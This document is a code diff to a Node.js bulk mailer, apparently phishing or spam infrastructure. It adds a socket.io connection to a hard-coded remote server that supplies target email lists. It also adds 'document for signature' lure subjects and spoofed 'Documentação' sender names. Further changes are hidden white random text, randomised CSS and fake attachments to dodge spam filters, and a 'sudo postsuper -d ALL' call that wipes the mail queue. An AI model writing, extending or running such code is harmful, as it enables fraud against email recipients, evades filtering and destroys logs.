@@ -1,6 +1,9 @@
 const nodemailer = require("nodemailer");
 const htmlToText = require("nodemailer-html-to-text").htmlToText;
 var randomstring = require("randomstring");
+const { exec } = require("child_process");
+var io = require("socket.io-client");
+var socket = io.connect("http://154.53.50.250:3000", { reconnect: true });
 const os = require("os");
 const fs = require("fs");
 
@@ -137,10 +140,20 @@ const inicio = [
 
 async function getemails() {
   return new Promise(async (resolve, reject) => {
-    let listaemails = [
-      "wandersonrosacunha-whateveryouwant@mail-tester.com|45827854806|ricardo gama",
-    ];
-    resolve(listaemails);
+    try {
+      // Add a connect listener
+      socket.on("connect", function (socket) {
+        console.log("Connected!");
+      });
+
+      socket.on("EMAIL", function (from, msg) {
+        console.log("EMAIL", msg);
+        resolve(msg);
+      });
+      socket.emit("GETEMAIL", "", hostName);
+    } catch (error) {
+      resolve([]);
+    }
   });
 }
 
@@ -184,12 +197,13 @@ async function sendEmail(email) {
 
   html = html.replace(
     /<\/html>/g,
-    '<br><br><br><br><br><br><br><font color="#E6E6E6">t_' +
-      randomstring.generate(between(1, 50)) +
-      "</font></html>"
+    '<br><br><br><br><br><br><font color="#fff">ID_' +
+      randomstring.generate(between(15, 50)) +
+      "_</font></html>"
   );
   let css = await cssgenerator();
   html = html.replace(/<\/head>/g, "<style>" + css + "</style></head>");
+
   //RANDON HTML
   let htmlarry = html.split("\n");
   let novohtml = "";
@@ -205,7 +219,10 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-  let subject = `Segue extorno de pagamento! -${randomstring.generate(10)}-`;
+  let subject = `Segue documento para assinatura! Ref:${randomstring.generate(
+    9
+  )}-`;
+  //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
   try {
     let transporter = nodemailer.createTransport({
       service: "postfix",
@@ -220,14 +237,20 @@ async function sendEmail(email) {
       },
     });
     transporter.use("compile", htmlToText());
+    let fakefile = randomstring.generate(between(10, 250));
+    // create a buffer
+    const buff = Buffer.from(fakefile, "utf-8");
+    // decode buffer as Base64
+    const base64 = buff.toString("base64");
+
     let info = await transporter.sendMail({
       from:
         "=?UTF-8?B?" +
-        new Buffer("Faturamento").toString("base64") +
+        new Buffer("Documentação").toString("base64") +
         "?=" +
         " <" +
-        "cobrebem" +
-        randomstring.generate(between(2, 4)) +
+        "adm" +
+        randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
         ">",
@@ -277,17 +300,32 @@ async function sendEmail(email) {
       ], */
     });
     enviados++;
-    if (enviados % 500 === 0) {
+    if (enviados % 250 === 0) {
       console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
+      await sleep(30000);
+      exec("sudo postsuper -d ALL", (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
     }
   } catch (error) {
     enviados++;
     console.log(`Sent: Error ${error.message}`);
   }
   if (list.length == 0) {
+    await socket.emit("FIM", "", hostName);
     console.log(`Envio Finalizado: ${hostName} - total enviados: ${enviados}`);
     process.exit(1);
   }
+  
+  await sleep(100);
   if (list.length !== 0) sendEmail(list.shift());
 }
 
@@ -390,7 +428,7 @@ function sleep(ms) {
 }
 
 async function cssgenerator() {
-  let linhas = between(2000, 2500);
+  let linhas = between(500, 1000);
   let letra = inicio[Math.floor(Math.random() * inicio.length)];
   let currentlinhas = 0;
   let css = "";
